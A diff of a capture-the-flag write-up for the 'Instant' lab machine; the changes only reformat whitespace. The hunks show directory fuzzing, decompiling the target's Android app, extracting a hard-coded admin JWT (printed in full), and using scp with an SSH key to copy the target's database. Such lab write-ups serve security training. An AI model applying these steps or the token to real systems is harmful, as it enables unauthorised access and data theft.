@@ -12,8 +12,8 @@ sticker: lucide//wallet
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 We need to add `instant.htb` to `/etc/hosts`:
 
 ```bash
@@ -41,11 +41,11 @@ Nothing, let's try to fuzz for hidden directories:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://instant.htb/" -ic -c -t 200
 
-img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 115ms]
-downloads               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 572ms]
-js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 105ms]
-css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 438ms]
-javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 106ms]
+img [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 115ms]
+downloads [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 572ms]
+js [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 105ms]
+css [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 438ms]
+javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 106ms]
 ```
 
 Nothing useful too, let's proceed by analyzing the source code and the functionalities of the web application:
@@ -65,7 +65,7 @@ This creates a directory, let's check it out:
 ```
 > ls
 
-assets  kotlin  lib  META-INF  original  res  smali  unknown  AndroidManifest.xml  apktool.yml
+assets kotlin lib META-INF original res smali unknown AndroidManifest.xml apktool.yml
 ```
 
 We can check the network security configuration at `/instant/res/xml`:
@@ -73,10 +73,10 @@ We can check the network security configuration at `/instant/res/xml`:
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <network-security-config>
-    <domain-config cleartextTrafficPermitted="true">
-        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
-        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
-    </domain-config>
+ <domain-config cleartextTrafficPermitted="true">
+ <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
+ <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
+ </domain-config>
 </network-security-config>
 ```
 
@@ -105,7 +105,7 @@ Let's try registering an user:
 
 
 ```
-curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"string\",  \"password\": \"test\",  \"pin\": \"10001\",  \"username\": \"test\"}"
+curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H "accept: application/json" -H "Content-Type: application/json" -d "{ \"email\": \"string\", \"password\": \"test\", \"pin\": \"10001\", \"username\": \"test\"}"
 
 {"Description":"User Registered! Login Now!","Status":201}
 ```
@@ -125,17 +125,17 @@ We can see our role, we are not admin user obviously but this helps us understan
 â¯ grep -r -i "admin"
 smali/com/instantlabs/instant/AdminActivities$1.smali:.class Lcom/instantlabs/instant/AdminActivities$1;
 smali/com/instantlabs/instant/AdminActivities$1.smali:.source "AdminActivities.java"
-smali/com/instantlabs/instant/AdminActivities$1.smali:    value = Lcom/instantlabs/instant/AdminActivities;->TestAdminAuthorization()Ljava/lang/String;
+smali/com/instantlabs/instant/AdminActivities$1.smali: value = Lcom/instantlabs/instant/AdminActivities;->TestAdminAuthorization()Ljava/lang/String;
 smali/com/instantlabs/instant/AdminActivities$1.smali:.field final synthetic this$0:Lcom/instantlabs/instant/AdminActivities;
-smali/com/instantlabs/instant/AdminActivities$1.smali:    const-class v0, Lcom/instantlabs/instant/AdminActivities;
+smali/com/instantlabs/instant/AdminActivities$1.smali: const-class v0, Lcom/instantlabs/instant/AdminActivities;
 smali/com/instantlabs/instant/AdminActivities$1.smali:.method constructor <init>(Lcom/instantlabs/instant/AdminActivities;)V
-smali/com/instantlabs/instant/AdminActivities$1.smali:    iput-object p1, p0, Lcom/instantlabs/instant/AdminActivities$1;->this$0:Lcom/instantlabs/instant/AdminActivities;
+smali/com/instantlabs/instant/AdminActivities$1.smali: iput-object p1, p0, Lcom/instantlabs/instant/AdminActivities$1;->this$0:Lcom/instantlabs/instant/AdminActivities;
 smali/com/instantlabs/instant/AdminActivities.smali:.class public Lcom/instantlabs/instant/AdminActivities;
 smali/com/instantlabs/instant/AdminActivities.smali:.source "AdminActivities.java"
 smali/com/instantlabs/instant/AdminActivities.smali:.method private TestAdminAuthorization()Ljava/lang/String;
-smali/com/instantlabs/instant/AdminActivities.smali:    new-instance v1, Lcom/instantlabs/instant/AdminActivities$1;
-smali/com/instantlabs/instant/AdminActivities.smali:    invoke-direct {v1, p0}, Lcom/instantlabs/instant/AdminActivities$1;-><init>(Lcom/instantlabs/instant/AdminActivities;)V
-smali/androidx/core/content/ContextCompat$LegacyServiceMapHolder.smali:    const-class v1, Landroid/app/admin/DevicePolicyManager;
+smali/com/instantlabs/instant/AdminActivities.smali: new-instance v1, Lcom/instantlabs/instant/AdminActivities$1;
+smali/com/instantlabs/instant/AdminActivities.smali: invoke-direct {v1, p0}, Lcom/instantlabs/instant/AdminActivities$1;-><init>(Lcom/instantlabs/instant/AdminActivities;)V
+smali/androidx/core/content/ContextCompat$LegacyServiceMapHolder.smali: const-class v1, Landroid/app/admin/DevicePolicyManager;
 ```
 
 
@@ -150,12 +150,12 @@ Let's read it:
 ```
  move-result-object v1
 
-    const-string v2, "Authorization"
+ const-string v2, "Authorization"
 
-    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
+ const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
 
-    .line 25
-    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
+ .line 25
+ invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
 
 ```
 
@@ -318,7 +318,7 @@ Let's try downloading that `instant.db` file to our machine and analyze it:
 ```
 scp -i id_rsa shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./ 
 
-instant.db                                                    100%   36KB 113.0KB/s 
+instant.db 100% 36KB 113.0KB/s 
 ```
 
 Now, let's open it then, for this, let's use `sqlitebrowser` to have a GUI:
